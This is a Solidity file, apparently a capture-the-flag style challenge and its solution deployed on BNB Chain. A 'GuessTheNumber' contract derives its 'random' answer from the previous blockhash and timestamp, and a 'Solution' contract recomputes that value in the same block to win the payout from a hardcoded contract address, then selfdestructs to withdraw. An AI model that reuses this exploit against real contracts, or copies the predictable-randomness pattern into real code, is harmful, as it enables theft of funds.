/**
 *Submitted for verification at BscScan.com on 2022-08-17
*/

pragma solidity ^0.4.21;

contract GuessTheNumber {
    function GuessTheNumber() public payable {
        require(msg.value == 0.1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 0.1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(0.2 ether);
        }
    }
}

contract Solution {
    function() public payable {}
    function destroy() public { selfdestruct(msg.sender);}
    function exe() public payable {
        require(msg.value == 0.1 ether);
        GuessTheNumber gtn = GuessTheNumber(0xe39fDE9972EC04D014fb0bBD6ECa7CD03d71E0b4);
        gtn.guess.value(msg.value)(uint8(keccak256(block.blockhash(block.number - 1), now)));
    }
}